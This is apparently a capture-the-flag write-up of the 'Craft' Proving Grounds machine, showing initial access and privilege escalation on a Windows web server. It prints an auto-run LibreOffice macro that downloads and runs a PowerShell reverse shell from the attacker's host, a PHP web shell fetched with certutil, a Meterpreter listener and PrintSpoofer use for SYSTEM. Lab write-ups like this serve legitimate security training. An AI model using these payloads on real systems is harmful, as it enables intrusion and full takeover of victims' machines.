### Craft Proving Grounds Practice

### Difficulty = Intermediate

### IP Address = 192.168.175.169

Nmap Scan

```
└─$ nmap -sCV -A 192.168.175.169 -p80 -oN nmapscan                     
Starting Nmap 7.92 ( https://nmap.org ) at 2023-02-23 23:35 WAT
Nmap scan report for 192.168.175.169
Host is up (0.21s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.48 ((Win64) OpenSSL/1.1.1k PHP/8.0.7)
|_http-title: Craft
|_http-server-header: Apache/2.4.48 (Win64) OpenSSL/1.1.1k PHP/8.0.7

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.55 seconds
```

From the scan we can tell that only one tcp port is open

Heading over to see what it is
![image](https://user-images.githubusercontent.com/113513376/221046662-3d73f892-cb01-4e17-8966-59ce005fb08c.png)

It doesn't contain anything much looking below shows a file upload form
![image](https://user-images.githubusercontent.com/113513376/221056128-935d2864-241a-448a-9b18-1a4122b93bff.png)

Uploading any file shows that it only accepts a .odt file 
![image](https://user-images.githubusercontent.com/113513376/221056229-d2f6ed55-35af-41c1-8eb0-7cbf5839908a.png)

After trying to upload a fake .odt file shows that it will be viewed soon
![image](https://user-images.githubusercontent.com/113513376/221056321-609ab0eb-cb2d-4baf-a87c-34899df2962e.png)

So with this we know that we can upload a .odt file which is just like an excel spreadsheet

But lets say if we manage to even upload a .php file we won't be able to execute it cause its been viewed by a person (bot)

Now we can perform a macros attack

Which basically puts in a malicious content in the file then after it is being viewed the macros content will be executed

### Payload Creation 

Here's what i'll do 
![image](https://0xdf.gitlab.io/img/image-20191126164802663.png)

```
I’ll open Calc, and go to Tools –> Macros –> Organize Macros –> LibreOffice Basic:
```

In the dialog box that pops up, I’ll select the document I’m working in on the left side (Untitled 1) and click “New”. I’ll give the module a name (“evil”), and click Ok to be taken to the macro editor:
![image](https://user-images.githubusercontent.com/113513376/221057141-7fc7502d-b1de-44bf-8b28-656672c72fda.png)

OpenOffice macros use Basic, a similar but [slightly different](https://wiki.openoffice.org/wiki/Documentation/FAQ/Macros/Can_I_use_my_Microsoft_Office_macros%3F) language to the VBA that’s in MS macros. To run a command on a Windows host from LibreOffice Basic, I’ll need to put it into Shell() as a string. So I wrap my command in "". To nest quotes, I’ll use two double quotes (""). I’ll call Shell to execute some simple download and execute code:

```
REM  *****  BASIC  *****

Sub Main

    Shell("cmd /c powershell ""IEX(New-Object Net.Webclient).downloadString('http://192.168.45.5/Invoke-PowerShellTcp.ps1')""")
    
End Sub
```

#### AutoOpen

Now I need to make sure this macro is run when the document is opened. I'll close the macro editors, and back in the document, go to Tools –> Customize -> Events tab:
![image](https://user-images.githubusercontent.com/113513376/221057696-e6d15dd4-c16c-4427-9b8c-79b4bc4a60fb.png)

I'll select "Open Document" and click on the "Macro…" button. I'll navigte to select my macro:
![image](https://user-images.githubusercontent.com/113513376/221059441-f630cdc9-d34e-47af-8b55-4d03bc709e02.png)

When I hit "OK", I see it now in the list:
![image](https://user-images.githubusercontent.com/113513376/221059503-f810f247-f894-461d-9aa4-bde2e5a4805b.png)

I'll save my sheet as shell.ods, and exit LibreOffice.

Reference to this [0xdf](https://0xdf.gitlab.io/2020/02/01/htb-re.html)

Cool with this payload i'll set up a listener on port 1337 and a http server on port 80 hosting a powershell reverse shell

I will rename shell.ods file to shell.odt

After uploading the shell.odt file i get back a connection after few seconds
![image](https://user-images.githubusercontent.com/113513376/221061013-fe9ebccc-8cb5-4f1e-900f-c9a0e1f8e8de.png)

Lets escalate priv 🤓

Checking user permission doesn't show anything interesting

```
PS C:\xampp\htdocs> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State   
============================= ============================== ========
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled 
SeCreateGlobalPrivilege       Create global objects          Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
PS C:\xampp\htdocs> 
```

Looking at the source code for the upload.php web page shows this

```
PS C:\xampp\htdocs> more upload.php
<?php

        //Check if the file is well uploaded
        if($_FILES['file']['error'] > 0) { echo 'Error during uploading, try again'; }
        
        
        //Set up valid extension
        $extsAllowed = array( 'odt' );
                
        $extUpload = strtolower( substr( strrchr($_FILES['file']['name'], '.') ,1) ) ;

        //Check if the uploaded file extension is allowed
        
        if (in_array($extUpload, $extsAllowed) ) { 
        
        //Upload the file on the server
        
        $name = "uploads/{$_FILES['file']['name']}";
        $result = move_uploaded_file($_FILES['file']['tmp_name'], $name);
        
        if($result){echo "You're resume was submitted , it will be reviewed shortly by our staff";}
                
        } else { echo 'File is not valid. Please submit ODT file'; }

        // Giving HR permission on the resume file
        exec('cmd /c "icacls C:\xampp\htdocs\uploads /grant thecybergeek:(OI)(CI)F /T"');
?>

PS C:\xampp\htdocs> 
```

What we're interested in is this

```
 exec('cmd /c "icacls C:\xampp\htdocs\uploads /grant thecybergeek:(OI)(CI)F /T"');
 ```
 
 We have full perm over the web directory and normally the web server is suppose to be run be apache but its granting it as `thecybergeek`
 
Since we know that the web server is running on php i can upload a php web shell

```
PS C:\xampp\htdocs> cmd /c certutil -urlcache -f http://192.168.45.5/lmao.php lmao.php
****  Online  ****
CertUtil: -URLCache command completed successfully.
PS C:\xampp\htdocs> dir


    Directory: C:\xampp\htdocs


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
d-----        7/13/2021   3:18 AM                assets                                                                
d-----        7/13/2021   3:18 AM                css                                                                   
d-----        7/13/2021   3:18 AM                js                                                                    
d-----        2/23/2023   4:50 PM                uploads                                                               
-a----         7/7/2021  10:53 AM           9635 index.php                                                             
-a----        2/23/2023   5:01 PM             31 lmao.php                                                              
-a----         7/7/2021   9:56 AM            835 upload.php                                                            


PS C:\xampp\htdocs> more lmao.php
<?php system($_GET['cmd']); ?>

PS C:\xampp\htdocs> 
```

#### Privilege Escalation

I can now access it on the web server
![image](https://user-images.githubusercontent.com/113513376/221066341-4c54da18-adeb-4c4a-8017-2a3d509f3ff0.png)

Looking at the privilege of this user we see SeImpersonatePrivilege Enabled
![image](https://user-images.githubusercontent.com/113513376/221066423-677267c7-e5bd-4717-895f-5ff51b64679f.png)

I created a reverse shell binary using msfvenom then uploaded it to the target as user apache
![image](https://user-images.githubusercontent.com/113513376/221066662-af7ac923-87be-4ff7-8ddc-fae76abe8f35.png)

```
PS C:\xampp\htdocs> dir


    Directory: C:\xampp\htdocs


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
d-----        7/13/2021   3:18 AM                assets                                                                
d-----        7/13/2021   3:18 AM                css                                                                   
d-----        7/13/2021   3:18 AM                js                                                                    
d-----        2/23/2023   4:50 PM                uploads                                                               
-a----         7/7/2021  10:53 AM           9635 index.php                                                             
-a----        2/23/2023   5:01 PM             31 lmao.php                                                              
-a----        2/23/2023   5:04 PM          73802 shell.exe                                                             
-a----         7/7/2021   9:56 AM            835 upload.php                                                            


PS C:\xampp\htdocs> icacls shell.exe
shell.exe CRAFT\apache:(I)(F)
          NT AUTHORITY\SYSTEM:(I)(F)
          BUILTIN\Administrators:(I)(F)
          BUILTIN\Users:(I)(RX)

Successfully processed 1 files; Failed processing 0 files
PS C:\xampp\htdocs> 
```

Running it gives us a reverse shell
![image](https://user-images.githubusercontent.com/113513376/221066831-5905c714-ba6f-42b3-87b4-77e6137e420b.png)

```
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 192.168.45.5:1337 
[*] Sending stage (175686 bytes) to 192.168.223.169
[*] Meterpreter session 2 opened (192.168.45.5:1337 -> 192.168.223.169:49824) at 2023-02-24 02:05:31 +0100

meterpreter > getuid
Server username: CRAFT\apache
meterpreter >
```

Searching for exploit leads here [Exploit](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/)

```
meterpreter > upload /home/mark/Desktop/B2B/Pg/Practice/Craft C:/users/apache/desktop                                             
[*] uploading  : /home/mark/Desktop/B2B/Pg/Practice/Craft/PrintSpoofer64.exe -> C:/users/apache/desktop\PrintSpoofer64.exe                                       
meterpreter > shell                                                                                                                  
Process 4540 created.                                                                                                                
Channel 22 created.                                                                                                                  
Microsoft Windows [Version 10.0.17763.2029]                                                                                          
(c) 2018 Microsoft Corporation. All rights reserved.                                                                                 
                                                                                                                                     
C:\xampp\apache>cd \users\apache\desktop                                                                                             
cd \users\apache\desktop                                                                                                             
                                                                                                                                     
C:\Users\apache\Desktop>dir                                                                                                          
dir                                                                                                                                  
 Volume in drive C has no label.                                                                                                     
 Volume Serial Number is 5C30-DCD7                                                                                                   

 Directory of C:\Users\apache\Desktop

02/23/2023  05:22 PM    <DIR>          .
02/23/2023  05:22 PM    <DIR>          ..
02/23/2023  05:22 PM            27,136 PrintSpoofer64.exe
               4 File(s)        110,626 bytes
               2 Dir(s)  10,690,072,576 bytes free

C:\Users\apache\Desktop>
```

Doing what the creator of the exploit says I got system shell 👽
 
```
C:\Users\apache\Desktop>PrintSpoofer64.exe -i -c cmd
PrintSpoofer64.exe -i -c cmd
[+] Found privilege: SeImpersonatePrivilege
[+] Named pipe listening...
[+] CreateProcessAsUser() OK
Microsoft Windows [Version 10.0.17763.2029]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami   
whoami 
nt authority\system

C:\Windows\system32>
```

And we're done

<br> <br> 
[Back To Home](../../index.md)

